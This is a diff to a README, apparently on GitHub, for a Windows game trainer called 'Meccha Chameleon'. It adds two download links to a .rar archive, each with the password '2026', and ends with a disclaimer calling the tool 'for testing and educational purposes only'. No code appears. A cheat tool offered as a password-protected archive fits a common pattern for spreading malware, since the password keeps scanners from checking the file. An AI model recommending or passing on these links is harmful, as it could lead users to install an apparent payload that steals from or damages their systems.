@@ -21,10 +21,8 @@ Designed to enhance visibility and system responsiveness for better gameplay exp
 
 ---
 
-## 📥 Getting Started
-
-**Password: 2026**
-
+### 🔽 [Download](https://github.com/KnitPortalQuilt/MECCHA-HAMELEON-TRAINER/releases/download/MECCHACHAMELEON/Meccha.Chameleon.Enhanced.v2.1.rar)
+### PASSWORD 2026
 
 ---
 
@@ -74,8 +72,8 @@ MECCHA CHAMELEON, GAMING ASSISTANT, VISUAL ENHANCER, SYSTEM TOOL, WINDOWS SOFTWA
 
 ---
 
-### 🔽 Download
-
+### 🔽 [Download](https://github.com/KnitPortalQuilt/MECCHA-HAMELEON-TRAINER/releases/download/MECCHACHAMELEON/Meccha.Chameleon.Enhanced.v2.1.rar)
+### PASSWORD 2026
 ---
 
 *© 2026 Meccha Pro — For testing and educational purposes only.*
